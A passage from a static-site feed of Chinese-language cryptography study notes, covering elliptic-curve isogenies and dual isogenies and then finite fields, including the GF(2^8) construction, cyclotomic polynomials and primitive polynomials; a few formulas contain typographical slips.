E^{\prime}(K)$,$K$的特征是$p&gt;0$,则有<br>$\phi=\alpha\circ(\pi^{\prime})^n,$<br>其中 $\alpha$是可分同源，$\pi^{\prime}$是$p$ -power 弗罗贝尼乌斯映射，$n\geq0$。<br>注：$\pi^\prime:(X{:}Y{:}Z)\mapsto(X^p{:}Y^p{:}Z^p)$</p><script type="math/tex; mode=display">\begin{aligned}&&&\bullet\phi 是可分同演:设n=0,\alpha=\alpha,\phi,则满足\phi=\alpha\circ(\pi^{\prime})^{n},\\&&&\bullet\phi 是不可分同源:根据引理2。有\phi(x,y)=\phi(a(x^p),b(x^p)y^p)。\\&&&\text{设 }\alpha_1(x,y):=(a(x),b(x)y),\text{ 有 }\phi=\alpha_1\circ\pi^{\prime}。\\&&&\text{如果 }\alpha_1\text{是可分同源,则满足 }\phi=\alpha\circ(\pi^{\prime})^n\quad(n=1,\alpha:=\alpha_1);\\&&&\text{如果 }\alpha_1\text{ 是不可分同源,根据引理2, 有}\\&&&\alpha_1(x,y)=\alpha_1(a_1(x^p),b_1(x^p))y^n)。\\&&&\text{设 }\alpha_2(x,y)=(\alpha_1(x),b_1(x)),\text{ 有 }\alpha_1=\alpha_2\circ\pi^{\prime},\\&&&\text{则 }\phi(x,y)=\alpha_1\circ\pi^{\prime}=\alpha_2\circ\pi^{\prime}\circ\pi^{\prime}=\alpha_2\circ(\pi^{\prime})^2。\\&&&\text{依此类推,有 }\phi=\alpha_n\circ(\pi^{\prime})^n\text{。令}\alpha:=\alpha_n,\text{ 有}\phi=\alpha\circ(\pi^{\prime})^n\text{。}\end{aligned}</script><h3 id="度的分解"><a href="#度的分解" class="headerlink" title="度的分解"></a>度的分解</h3><p><strong>定义(度的分解)</strong>:对于同源的分解 $\phi=\alpha\circ(\pi^{\prime})^n$,设$deg_s\phi$是其可<br>分度 (separable degree), $deg_i\phi$是其不可分度 (inseparable<br>degree),则<br>$deg_s\phi:=deg\alpha,\:deg_i\phi:=p^n,$<br>而且总是有<br>$deg\phi=(deg_s\phi)\cdot(deg_i\phi)=deg\ \alpha\cdot p^n$</p><blockquote><p>例：<script type="math/tex">\begin{aligned}&\phi=(\pi^{\prime})^n\\&(\pi^{\prime})^n\text{的特征大于0,是可分解的。}\\&\text{设 }(\pi^{\prime})^n=\alpha\circ(\pi^{\prime})^n\text{,则有 }\alpha:P\mapsto P。\\&\text{所以,}deg\alpha=1\text{。故而,}deg_s\pi^{\prime}=1。\end{aligned}</script></p></blockquote><p><strong>定义(纯不可分同源)</strong>:可分度是1的同源,叫纯不可分的(purely inseparable)</p><p><strong>性质</strong>:纯不可分同源的度必然是$p^n$的形式(反之,未必成立)。</p><p>$deg\phi=1$ (同构)时，则$\phi$具有如下性质：</p><ul><li>$\phi$是可分的(即$(\frac u(x){v(x)})^{\prime}\neq0)$</li><li>$\phi$也是纯不可分的 (即$deg_s\not\phi=1)$</li></ul><hr><h2 id="代数闭包-algebraic-closure"><a href="#代数闭包-algebraic-closure" class="headerlink" title="代数闭包(algebraic closure)"></a>代数闭包(algebraic closure)</h2><p>同源 $\phi{:}E(K)\to E^{\prime}(K)$诱导了一个$E(\overline{K})\to E^{\prime}(\overline{K})$的群同态。</p><blockquote><p>例：$E(F_q)$上的弗罗贝尼乌斯自同态$\pi{:}\left(X{:}Y{:}Z\right)\mapsto\left(X^q{:}Y^q{:}Z^q\right)$,<br>诱导了一个$E(\overline{F}_q)\to E^{\prime}(\overline{F}_q)$的群同构。</p></blockquote><hr><h2 id="同源核-isogeny-kernel"><a href="#同源核-isogeny-kernel" class="headerlink" title="同源核(isogeny kernel)"></a>同源核(isogeny kernel)</h2><p>本质上是同源的同态核</p><h3 id="第一同源核定理-First-isogeny-kernel-theorem"><a href="#第一同源核定理-First-isogeny-kernel-theorem" class="headerlink" title="第一同源核定理(First isogeny-kernel theorem)"></a>第一同源核定理(First isogeny-kernel theorem)</h3><p><strong>定理</strong>：同源$\phi=\alpha$ o$(\pi^{\prime})^n$,则$|\ker\phi|=deg(\alpha)$<br>(同源核的阶等于其可分度)</p><p>$|\mathrm{Ker~}\phi|=|\mathrm{Ker~}\alpha|=|S|=deg\left(g\right)=deg\left(\alpha\right)$</p><p>例：$deg(\alpha)=3$,则$|\ker\phi|=3$</p><h3 id="第二同源核定理-Second-isogeny-kernel-theorem"><a href="#第二同源核定理-Second-isogeny-kernel-theorem" class="headerlink" title="第二同源核定理(Second isogeny-kernel theorem)"></a>第二同源核定理(Second isogeny-kernel theorem)</h3><p><strong>定理</strong>：设$E(K)$是椭圆曲线，$G$是$E(\bar{K})$的有限子群，则存在椭圆曲线$E^\prime$,以及可分同源$\phi:E\to E^{\prime}$,使得 $Ker \phi=G$,且$E^\prime$和$\phi$在同构意义下是唯一的。</p><p><strong>推论</strong>:度是合数的同源可以被分解成一系列度是素数的同源。</p><h2 id="椭圆曲线的自同态环"><a href="#椭圆曲线的自同态环" class="headerlink" title="椭圆曲线的自同态环"></a>椭圆曲线的自同态环</h2><h3 id="同态群-groups-of-homomorphisms"><a href="#同态群-groups-of-homomorphisms" class="headerlink" title="同态群(groups of homomorphisms)"></a>同态群(groups of homomorphisms)</h3><p>设椭圆曲线$E$和$E^{\prime}$定义在域$K$上，定义集合</p><p>$Hom(E,E^{\prime}):={\text{所有同源}\alpha{:}E\to E^{\prime}}\cup{[0]}$</p><blockquote><p>$Hom(E,E^{\prime})$上的加法运算：对于任意 $\alpha,\beta\in Hom(E,E^{\prime})$,任意点<br>$P\in E(\overline{K}),\alpha+\beta$定义为$(\alpha+\beta)(P):=\alpha(P)+\beta(P)$</p><p>构成加法阿贝尔群，加法单位元：$[0]:P\mapsto 0P(=O)$</p></blockquote><p><strong>引理1</strong></p><p>设 $\alpha, \beta \in Hom(E,E’)$，对于所有点 $P \in E(\overline{K})$，如果 $\alpha(P) = \beta(P)$，则 $\alpha = \beta$</p><p><strong>引理2</strong></p><p>对于所有 $n \in Z$ 和 $\alpha \in Hom(E,E’)$，有 $[n] \circ \alpha = n\alpha = \alpha \circ [n].$</p><h4 id="分配律"><a href="#分配律" class="headerlink" title="分配律"></a>分配律</h4><p>对于$\alpha,\beta\in Ho\boldsymbol{m}(E,E^{\prime}),\phi\in Ho\boldsymbol{m}(E^{\prime},E^{\prime\prime})$,有<br>$\phi\circ(\alpha+\beta)=\phi\circ\alpha+\phi\circ\beta$</p><p>对于$\phi\in Ho\boldsymbol{m}(E,E^{\prime}),\boldsymbol{\alpha},\beta\in H\boldsymbol{om}(E^{\prime},E^{\prime\prime})$,有<br>$(\alpha+\beta)\circ\phi=\alpha\circ\phi+\beta\circ\phi$</p><h4 id="消去律"><a href="#消去律" class="headerlink" title="消去律"></a>消去律</h4><p>消去律：设 $\boldsymbol{\alpha},\boldsymbol{\beta}{:}E\to E^{\prime},\boldsymbol{\phi}{:}E^{\prime}\to E^{\prime\prime}$是同源，有</p><script type="math/tex; mode=display">\phi\circ\alpha=\phi\circ\beta\quad\Longrightarrow\quad\alpha=\beta</script><p>设 $\phi{:}E\longrightarrow E^{\prime},\boldsymbol{\alpha},\boldsymbol{\beta}{:}E^{\prime}\to E^{\prime\prime}$是同源，有</p><script type="math/tex; mode=display">\alpha\circ\phi=\beta\circ\phi\Rightarrow\alpha=\beta</script><h3 id="对偶同源"><a href="#对偶同源" class="headerlink" title="对偶同源"></a>对偶同源</h3><p><strong>定义(对偶同源):</strong> </p><p>设同源 $\phi:E \rightarrow E’$ , 其度为 $deg(\phi)$ , 则 $\phi$ 唯一的对偶同源为 $\widehat{\phi}$ , 满足 </p><p>$\widehat{\phi} \circ \phi = [deg(\phi)]$ </p><blockquote><p>$\text{另外,定义}[\widehat0]:=[0]$</p></blockquote><p>例: 设 $deg(\phi) = 3$, 则 $\widehat{\phi} \circ \phi = [deg(\phi)] = [3]$, 即 对于任意点 $P \in E$, 有 <script type="math/tex">\widehat{\phi} \circ \phi(P) = \widehat{\phi}(\phi(P)) = [3](P) = 3P</script></p><p><strong>性质1</strong>：如果 $\widehat{\phi} \circ \phi = [\deg(\phi)]$，那么 $\phi \circ \widehat{\phi} = [\deg(\phi)]$，也即 <script type="math/tex">\widehat{\widehat{\phi}} = \phi</script> </p><p>证明：$(\phi \circ \widehat{\phi}) \circ \phi = \phi \circ (\widehat{\phi} \circ \phi)$ （结合律） </p><p>$= \phi \circ [\deg(\phi)]$ （对偶同源定义） </p><p>$= [\deg(\phi)] \circ \phi$ （《同态群》引理2） </p><p>则 $\phi \circ \widehat{\phi} = [\deg(\phi)]$ （消去律）</p><p><strong>性质2</strong>：对于任意 $n\in\mathbb{Z}$,有$[\widehat n]=[n]$<br>证明：</p><script type="math/tex; mode=display">\begin{aligned}[n]\circ[n]&=[n^2]\\&=[deg([n])]\end{aligned}</script><p><strong>性质3</strong>：对于任意 $\alpha, \beta \in Hom(E,E’)$，有 $\widehat{\alpha + \beta} = \widehat{\alpha} + \widehat{\beta}$</p><p><strong>性质4</strong>：对于任意$\alpha\in Hom(E^{\prime},E^{\prime\prime}),\beta\in Hom(E,E^{\prime})$,有</p><script type="math/tex; mode=display">\widehat{\alpha\circ\beta}=\widehat{\beta}\circ\widehat{\alpha}</script><blockquote><p>$\alpha\circ\beta$相当于$\phi$<br>$\widehat{\beta}\circ\widehat{\alpha}$相当于$\widehat{\phi}$<br>$[deg(\alpha\circ\beta)]$相当于$[deg(\phi)]$</p></blockquote><h1 id="未完待续……"><a href="#未完待续……" class="headerlink" title="未完待续……"></a>未完待续……</h1>]]></content>
      
      
      <categories>
          
          <category> Crypto数学基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
            <tag> 筑基篇 </tag>
            
            <tag> 椭圆曲线 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>筑基篇·抽象代数·有限域</title>
      <link href="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/"/>
      <url>/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<h2 id="密码学学习笔记——筑基篇·卷四（有限域）"><a href="#密码学学习笔记——筑基篇·卷四（有限域）" class="headerlink" title="密码学学习笔记——筑基篇·卷四（有限域）"></a>密码学学习笔记——筑基篇·卷四（有限域）</h2><hr><h1 id="有限域"><a href="#有限域" class="headerlink" title="有限域"></a>有限域</h1><hr><h2 id="有限域-伽罗瓦域"><a href="#有限域-伽罗瓦域" class="headerlink" title="有限域(伽罗瓦域)"></a>有限域(伽罗瓦域)</h2><blockquote><p><strong>概念回顾</strong>:</p><ul><li><p><strong>有限域</strong>：元素个数(阶)有限的域。</p></li><li><p><strong>特征</strong>：$ma=\theta$ ($\forall a\in R)$的最小正整数$m;$ 否则 $m=0$。即 Char $R=m$<br>$(me=\theta\left(e\in R\right)$的最小正整数$m;$ 否则 $m=0)$</p><p><strong>有限域的特征一定是素数</strong></p></li><li><p><strong>素域</strong>：不包含任何真子域的域 (任何真子集都不会构成其子域)</p></li></ul></blockquote><p>从下面开始，若无特殊说明$p$为素数，$F$为有限域。</p><p><strong>定理1</strong>:阶为素数的有限域必是素域，其特征是这个素数</p><p><strong>定理2</strong>:任何有限域都包含一个同构于$Z_p$的子域</p><p>引理:$K是F的子域,\quad|K|=q,\quad[F{:}K]=n,\quad则|F|=q^n$</p><p><strong>定理2</strong>: $F的特征是p,K是F的素子域,[F;K]=n, 则 |F|=p^n$</p><hr><h2 id="有限域的唯一性"><a href="#有限域的唯一性" class="headerlink" title="有限域的唯一性"></a>有限域的唯一性</h2><p><strong>定理</strong> (有限域的唯一性):对于任意素数$p$,任意正整数$n$,都存在阶为$p^n$的有限域。任何阶为$p^n$的有限域都同构于$x^{p^n}-x$在$Z_p$上的分裂域。</p><p><strong>引理</strong>：$F$的阶为$q$,$K$是$F$的子域，$\forall a\in F$,则</p><p>(1) $a^q=a$</p><p>$(2)x^q-x\in K[X]$在$K$上的分裂域为$F$,且 $x^q-x=\prod_{a\in F}(x-a)$</p><p><strong>结论</strong>:具有相同元素的有限域都是同构的<br>阶为q的有限域，统一用<strong>F</strong>表示(有的书里用<strong>GF(q)</strong>表示)</p><hr><h2 id="有限域的结构特点"><a href="#有限域的结构特点" class="headerlink" title="有限域的结构特点"></a>有限域的结构特点</h2><ul><li><p>有限域$\Longrightarrow$阶为$p^n$</p><p>任意素数$p$,任意正整数$n\Rightarrow$存在阶为$p^n$的有限域</p></li><li><p>阶为$p^n$的有限域，特征为$p$,包含阶为$p$的素子域</p><p>$n$是其在该素子域上的扩张维度</p></li></ul><hr><h2 id="子域准则-subfield-criterion"><a href="#子域准则-subfield-criterion" class="headerlink" title="子域准则 (subfield criterion)"></a>子域准则 (subfield criterion)</h2><p><strong>定理 (子域准则)</strong>:设$q=p^n$,<strong>有限域</strong>$F_q$<strong>每个子域的阶都具有</strong>$p^m$的<strong>形式</strong>，<br>其中$m$是$n$的<strong>正因子</strong>。反之，如果$m$是$n$的<strong>正因子</strong>，必然存在$F_q$的唯一子域，其阶为$p^m$。</p><blockquote><p>例：例：求有限域$F_{2^{30}}$的所有子域</p><p>解：30的正因子有1，2,3,5,6,10,15,30,则<br>所求子域为$F_2,F_{2^2},F_{2^3},F_{2^5},F_{2^6},F_{2^{10}},F_{2^{15}},F_{2^{30}}$</p><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/image-20240820085851977.png" alt="image-20240820085851977"></p></blockquote><hr><h2 id="有限域的乘法群"><a href="#有限域的乘法群" class="headerlink" title="有限域的乘法群"></a>有限域的乘法群</h2><p>$F_q$:有限域(有$q$个元素)<br>$F_q^*$:有限域的乘法群(不包含零元，只有$q-1$个元素)</p><p><strong>定理1</strong>：有限域的乘法群是<strong>循环群</strong></p><h3 id="本原元-primitive-element"><a href="#本原元-primitive-element" class="headerlink" title="本原元(primitive element)"></a>本原元(primitive element)</h3><p><strong>定义 (本原元)</strong>: 有限域$F_q$乘法群的<strong>生成元</strong>称为$F_q$的<strong>本原元.</strong></p><p>区分概念：</p><p>本原元：有限域乘法群的生成元<br>原根：模运算下循环群的生成元</p><p><strong>定理2</strong>:$F_r是F_q的有限扩张,则F_r是F_q的单代数扩张:对于任意F_r的本原元a,都有F_r=F_q(a)。$</p><p><strong>推论</strong>：对于任意有限域$F_q$,任意正整数$n$,$F_q[X]$里都有一个度为$n$的不可约多项式。</p><hr><h2 id="构造有限域"><a href="#构造有限域" class="headerlink" title="构造有限域"></a>构造有限域</h2><p>$F_q\rightarrow F_{q^n}$</p><p>基于“不可约多项式”构造有限域：$F_q[X]/(f(x))$<br>基于“基”构造有限域：$F_q(a),f(a)=0$</p><script type="math/tex; mode=display">F_{q^n}\colon F_q[X]/(f(x))\cong F_q(a)</script><h3 id="基于不可约多项式构造有限域"><a href="#基于不可约多项式构造有限域" class="headerlink" title="基于不可约多项式构造有限域"></a>基于不可约多项式构造有限域</h3><p>$f(x)\in F_q[X]$是不可约多项式，则 $F_q[X]/(f(x))$是有限域<br>$deg(f(x))=n$,则$F_q<a href="f(x">X</a>)=F_q^n$</p><blockquote><p>例子:$F_{2^{8}}={r(x)|r(x)\in F_2[X],deg(r(x))&lt;8}$</p><p>$r(x)=a_7x^7+\cdots+a_1x+a_0$</p><script type="math/tex; mode=display">r(x){:}0x^{7}+\cdots+0x+0\longrightarrow00\\x^{7}+\cdots+0x+0\longrightarrow01\\\cdots\\x^{7}+\cdots+x+1\longrightarrow FF</script><p>多项式：$x^6+x^4+x^2+x+1$<br>二进制：01010111</p><p>十六进制：57<br>十六进制：57+83=D4(二进制对应比特异或)<br>多项式：$(x^6+x^4+x^2+x+1)+(x^7+x+1)=x^7+x^6+x^4+x^2$(二进制：11010100十六进制：$D4$)</p><p>十六进制：57×83<br>多项式：$(x^6+x^4+x^2+x+1)\times(x^7+x+1)$ mod $f(x)$<br>多项式的扩展欧几里得算法</p></blockquote><script type="math/tex; mode=display">r_1(x),r_2(x)\in F_{q^n}</script><p>加法：$r_1(x)+r_2(x)$(不需要 $f(x)$参与)<br>乘法：$r_1(x)r_2(x)$ mod $f(x)$ (扩展的欧几里得算法)</p><h3 id="基于“基”构造有限域"><a href="#基于“基”构造有限域" class="headerlink" title="基于“基”构造有限域"></a>基于“基”构造有限域</h3><p>1.$ 找$F_q[X]$里的不可约多项式$f(x)$</p><p>2.$ 算出$f(x)$的一个根，设为$a$,即$f(a)=\theta$。</p><p>扩域就是单代数扩张$F_q(a)$</p><ol><li><p>设$deg(f(x))=n$,则$F_q(a)$的基为：$e,a,…,a^n-1$</p></li><li><p>$F_q(a)$元素：$b_0+ b_1a+ \cdots + b_{n- 1}a^{n- 1}$ $( F_q( a) = F_{q^n})$</p><p>$b_i是F_q里的元素$</p></li></ol><blockquote><p>例：$f(x)=x^{8}+x^{4}+x^{3}+x+1$</p><p>$f(a)=a^{8}+a^{4}+a^{3}+a^{4}+4$</p><p>$F_{2^{8}}={b_{0}+b_{1}a+\cdots+b_{7}a^{7}|b_{i}\in F_{2}}$</p><p>十六进制:57<br>二进制:01010111<br>元素:$a^6+a^4+a^2+a+1 $</p><p>$57+83=D4\colon\left(a^6+a^4+a^2+a+1\right)+\left(a^7+a+1\right)=a^7+a^6+a^4+a^2$</p><script type="math/tex; mode=display">\begin{aligned}&57\times83\colon(a^6+a^4+a^2+a+1)\times(a^7+a+1)\\&=a^{13}+a^{11}+a^9+a^8+a^6+a^5+a^4+a^3+1\\&f(a)=a^3+a^4+a^3+a+1=0\text{,有}\\&a^8=-a^4-a^3-a-1=a^4+a^3+a+1\\&a^9=a^5+a^4+a^2+a\\&a^{11}=a^7+a^6+a^4+a^3\\&a^{13}=a^9+a^3+a^5+a^5\\&57\times83=C1:\left(a^6+a^4+a^2+a+1\right)\times\left(a^7+a+1\right)=a^7+a^6+1\end{aligned}</script></blockquote><hr><h2 id="分圆域-cyclotomic-field"><a href="#分圆域-cyclotomic-field" class="headerlink" title="分圆域(cyclotomic field)"></a>分圆域(cyclotomic field)</h2><p>$n是正整数，K是任意域，f(x)=x^n-e\in K[x]$</p><script type="math/tex; mode=display">f(x)=x^n-e=(x-b_1)...(x-b_n)</script><script type="math/tex; mode=display">1\leq i\leq n,\:f(b_i)=b_i^n-e=(x-b_1)\:...(b_i-b_i)\:...(x-b_n)=\theta</script><p>$b_i$ 是$x^n-e$的根。</p><p>$x^n-e$在$K$上的分裂域为$K(b_1,…,b_n)$</p><p><strong>定义(分圆域)</strong>:$n$是正整数，$K$是任意域，$x^n-e$在$K$上的分<br>裂域称为$K$上$n$次分圆域，记为$K^{(n)}$。</p><script type="math/tex; mode=display">1\leq i\leq n, f(b_i)=b_i^n-e=(x-b_1) ...(b_i-b_i) ...(x-b_n)=\theta\\\text{有 }b_i^n=e\text{,即 }b_1,...,b_n\text{都是}e\text{的}n\text{次根。}\\\text{定义}(n\text{次单位根})\text{:}x^n-e\text{在}K^{(n)}\text{里的根}(\text{即 }b_1,...,b_n)\text{称为}\\K\text{上}n\text{次单位根}(n\text{th roots of unity})\text{。}</script><p>$E^{(n)}$:$x^n-e$在$K^{(n)}$里的根组成的集合，记为$E^{(n)}$<br>$E^{(n)}$的结构依赖于$n$和$K$的特征$m$。</p><p><strong>定理1</strong>：$K$的特征$m$不是$n$的因子，则$E^{(n)}$是<strong>乘法循环群，阶</strong>为$n$。</p><p><strong>定义$(n$次本原单位根)</strong>:$E^(n)$是乘法循环群时 (即$m$不是$n$的因子),<br>$E^{(n)}$的生成元称为$K$上$n$<strong>次本原单位根(primitive $n$th root of</strong><br><strong>unity)。</strong></p><p><strong>概念区分</strong>：</p><ul><li>本原元：有限域乘法群的生成元</li><li>原根：模运算下循环群的生成元</li><li>$n$次本原单位根：乘法循环群 $E^{(n)}$的生成元</li></ul><blockquote><p>例：$n$次分圆域$\mathbb{Q}^(n)$是$x^n-1$在Q上的分裂域</p><p>$\mathbb{Q}^{(n)}$是复数域的子域。</p><p><img src="/2024/08/11/%E7%AD%91%E5%9F%BA%E7%AF%87%C2%B7%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%C2%B7%E6%9C%89%E9%99%90%E5%9F%9F/image-20240821114313909.png" alt="几何意义"></p></blockquote><h3 id="分圆多项式-cyclotomic-polynomial"><a href="#分圆多项式-cyclotomic-polynomial" class="headerlink" title="分圆多项式 (cyclotomic polynomial)"></a>分圆多项式 (cyclotomic polynomial)</h3><ul><li>$K$的特征不是$n$的因子，则$x^n-e$在$K^(n)$里的根形成乘法循环群$E^{(n)}$</li><li>$E^{(n)}:n$个元素，$\phi(n)$个<strong>生成元$(n$次本原单位根)</strong></li></ul><p><strong>定义(分圆多项式)</strong>:</p><p>域$K$的特征不是正整数$n$的因子，$a_1,…,a_r$<br>是K上所有$n$次本原单位根，则多项式</p><script type="math/tex; mode=display">Q_n(x)=\prod_{i=1}^r(x-a_i)</script><p>称为$K$上<strong>$n$次分圆多项式</strong>，其中$r=\phi(n)$。</p><p>定义(分圆多项式):域$K$的特征不是正整数$n$的因子，$a$是$K$上的<br>一个$n$次本原单位根，则多项式</p><script type="math/tex; mode=display">Q_n(x)=\prod_{s=1}^n(x-a^s)\\gcd(s,n)=1</script><p>称为$K$上<strong>$n$次分圆多项式。</strong></p><p><strong>定理1</strong>:K的特征不是正整数$n$的因子，则$x^n-e=\prod_{d|n}Q_d(x)$</p><p><strong>引理</strong>：$d$是正整数$n$的真因子 $(1\leq d&lt;n)$,则$Q_n(x)\mid\frac{x^n-e}{x^d-e}$</p><h3 id="基于分圆域构造有限域"><a href="#基于分圆域构造有限域" class="headerlink" title="基于分圆域构造有限域"></a>基于分圆域构造有限域</h3><p><strong>定理1：</strong>有限域$F$的特征不是正整数$n$的因子，则</p><p>$(1)Q_n(x)$可以分解为$F[X]$里$\phi(n)/d$个不同的度为$d$的首一不可约多项式的乘积，$d$ 是满足$q^d\equiv1\left(modn\right)$的最小正整数。<br>$(2)F^{(n)}$是这些多项式的分裂域<br>$(3)\left[F^{(n)}{:}F\right]=d$。设$F=F_q$,则 $F^{(n)}=F_{q^d}$</p><p><strong>定理2：</strong>有限域$K$是$F_q$的任意子域，则$F_q$是$K$上的$q-1$次分圆域</p><blockquote><p>例：$F_{16}$是$F_2$、$F_4$、$F_8$上的15次分圆域</p></blockquote><p>基于“分圆域”构造有限域</p><p>设$F_p$是$F_q$的子域，则$F_q$是$F_p$上的$q-1$次分圆域</p><ol><li>在$F_p[X]$里分解$Q_{q-1}(x)\in F_p[X]$为首一不可约多项式的乘积</li><li>求出任意一个首一不可约多项式的根$a$,易知$a\in F_q$是本原元</li><li>$\theta , \boldsymbol{a}, \boldsymbol{a}^2, . . . , \boldsymbol{a}^{q- 1}$就是$F_q$里的元素</li></ol><hr><h2 id="有限域的矩阵表示"><a href="#有限域的矩阵表示" class="headerlink" title="有限域的矩阵表示"></a>有限域的矩阵表示</h2><h3 id="伴随矩阵-companion-matrix"><a href="#伴随矩阵-companion-matrix" class="headerlink" title="伴随矩阵(companion matrix)"></a>伴随矩阵(companion matrix)</h3><p><strong>定义(伴随矩阵):</strong>设$K$是域，$f(x)=a_0+a_1x+\cdots+a_{n-1}x^{n-1}+x^n\in$<br>$K[X]$是首一多项式。$f(x)$的伴随矩阵是如下的$n\times n$矩阵：<img src="https://img.simpletex.net/pdf/BzBdZhBa/fQEB1mkZp284u22sUFSrikvtsU9gt5e7e.png" alt></p><script type="math/tex; mode=display">f(A)=a_0I+a_1A+\cdots+a_{n-1}A^{n-1}+A^n=\theta</script><p>其中，$I$为$n\times n$单位矩阵</p><h3 id="基于“伴随矩阵”构造有限域"><a href="#基于“伴随矩阵”构造有限域" class="headerlink" title="基于“伴随矩阵”构造有限域"></a>基于“伴随矩阵”构造有限域</h3><p>一.设$f(x)\in F_p\left[X\right]$是<strong>首一不可约多项式</strong>，度为$n$</p><ol><li>$A$是$f(x)$的伴随矩阵，则有 $f(A)=\theta$</li><li>构造一组基$I,A,…,A^{n-1}$</li><li>$F_{p^n}$的元素为 $b_0I+b_1A+\cdots+b_{n-1}A^{n-1}$,其中 $b_0,b_1,…,b_{n-1}\in F_p$</li></ol><p>二.$设F_q是F_p的扩域,则F_q是F_p上的q-1次分圆域$</p><ol><li>$Q_{q-1}(x)分解为首一不可约多项式的乘积,f(x)是其中一个多项式。$</li><li>$令C是f(x)的伴随矩阵,则f(C)=\theta,有Q_{q-1}(C)=\theta$</li><li>$C是Q_{q-1}(x)的根,也是F_q的本原元$</li><li>$F_q的元素为\theta,C,\ldots,C^{q-1}$</li></ol><hr><h2 id="多项式的阶-order"><a href="#多项式的阶-order" class="headerlink" title="多项式的阶(order)"></a>多项式的阶(order)</h2><script type="math/tex; mode=display">\begin{aligned}&\text{定义(多项式的阶):又称多项式的周期(period)、多项式的指数}\\&(\text{exponent)。设}f(x)\text{是有限域上的非零多项式,则}\\&·f(x)的常数项不为零元:使得f(x)|(x^n-e)的最小正整数n,\\&\text{称为}f(x)\text{的阶,记为 }ord\left(f(x)\right)\text{。}\\&·f(x)\text{的常数项为零元:设}f(x)=x^tf^{\prime}(x)\text{(}f^{\prime}(x)\text{的常数项不为零}\\&\text{元),则 }ord\left(f(x)\right)=ord\left(f^{\prime}(x)\right)\end{aligned}</script><p><strong>性质</strong>：设$f(x)\in F_q[X]$是非常数多项式，它的常数项不为零元，则存在正整数$n\leq q^m-1$,使得$f(x)|(x^n-e)$<br>特别地：</p><ol><li><strong>常数多项式的阶为1</strong> (证明：设$a\in F_q[X]$是常数多项式，则 $x-e=aa^{-1}(x-$<br>$e)$,有$a|(x-e)$,即$ord(a)=1)$</li><li><strong>多项式$x$ 的阶为1</strong> (证明：设$f(x)=x$,常数项为零元，则 $f(x)=xf^{\prime}(x)，f’(x)=e\text{,有}ord\big(f(x)\big)=ord(f’(x))=ord(e)=1\big)$</li></ol><h3 id="计算多项式的阶"><a href="#计算多项式的阶" class="headerlink" title="计算多项式的阶"></a>计算多项式的阶</h3><ol><li>将多项式f(x)因式分解成首一不可约多项式的乘积</li><li>分别算出这些首一不可约多项式的阶</li><li>用这些首一不可约多项式的阶算出f(x)的阶</li></ol><p><strong>定理1</strong>：设 $f(x)=g_1(x)g_2(x)…g_k(x)$是有限域上的多项式，$g_1(x),…,g_k(x)$两两互素的非零多项式，则</p><p>$ord(f(x))=lcm(ord(g_1(x)),…,ord(g_k(x)))$。</p><p><strong>定理2</strong>：$g(x)\in F_q[X]$是不可约多项式，度为$m$,阶为$n$,常数<br>项不为零元。$a\in F_{q^m}^*,g(a)=\theta$,则 $n$等于$a$在$F_q^m$里的阶</p><p><strong>推论</strong>：$g(x)\in F_q[X]是不可约多项式，度为m，则ord(g(x))|(q^m-1)$</p><p><strong>定理3</strong>：$g(x)\in F_q[X]$是不可约多项式，阶为$n$,常数项不为零元，则$ord( g( \boldsymbol{x}) ^b) = \boldsymbol{n}p^t$ $( \boldsymbol{b}$是正整数),其中$p$是$F_q$的特征,$t$是满足$p^t\geq b$的最小整数。</p><p><strong>定理4</strong>：$f(x)\in F_q[X]\text{是非常数多项式,它的常数项不为零元,}$</p><p>$f(x)=ag_1^{b_1}(x)…g_k^{b_k}(x)$</p><p>$a\in F_q,b_1,…,b_k\text{是正整数,}g_1(x)…,g_k(x)\in F_q[X]\text{是两两互素的首一不可约多项式,则 }$</p><p>$ord(f(x))=np^t\text{,其中}p\text{是}F_q\text{的特征,}t\text{是满足}p^t\geq max(b_1,…,b_k)\text{ 的最小整数,}$</p><p>$n=lcm(ord(g_1(x)),…,ord(g_k(x)))\text{。}$</p><blockquote><script type="math/tex; mode=display">\begin{aligned}&\text{例：}f(x)=x^{10}+x^9+x^3+x^2+e\in F_2[X] \\&1.f(x)=\left(x^2+x+e\right)^3(x^4+x+e) \\&2.\left(x^2+x+e\right)^3\text{的阶为12} \\&3.x^4+x+e\text{的阶为15}(定理2、推论) \\&4.f(x)\text{的阶为}lcm(12,15)=60(定理1) \end{aligned}</script></blockquote><hr><h2 id="本原多项式-primitive-polynomial"><a href="#本原多项式-primitive-polynomial" class="headerlink" title="本原多项式(primitive polynomial)"></a>本原多项式(primitive polynomial)</h2><p>有限域里本原元的极小多项式</p><p><strong>定义(本原多项式):</strong> $f(x)\in F_q[X]$是非常数多项式，度为$m$,设$a\in F_q^m$是本原元，如果$f(x)$是$a$在$F_q$上的极小多项式，则$f(x)$称为$F_q$上的本原多项式。</p><ul><li>极小多项式$\Rightarrow$不可约多项式，则 本原多项式$\Rightarrow$不可约多项式</li><li>$f( a) = \theta$, $a\in F_{q^m}$是本原元，则 $f(x)$的根$a$是$F_q^m$的生成元</li></ul><p>$定理1:f(x)\in F_q[X]$,度为$m$,则 $f(x)$是$F_q$上的本原多项式$\Leftrightarrow f(x)$是首一的，常数项非零元，$ord(f(x))=q^m-1$</p><script type="math/tex; mode=display">\begin{aligned}&\text{定理2:}f(x)\in F_q[X]\text{是非常数首一多项式,度为}m\text{,}a=(-1)^mf(0)\text{,则}\\&f(x)\text{是}F_q\text{上的本原多项式}\Leftrightarrow a\in F_q\text{是本原元,}r=\frac{q^m-1}{q-1}\text{是满足 }x^r\mathrm{~mod~}f(x)\\&\text{等于}F_q\text{的某个元素的最小正整数。另外,}f(x)\text{是}F_q\text{上的本原多项式}\Longrightarrow x^r\equiv\\&a\left(mod\ 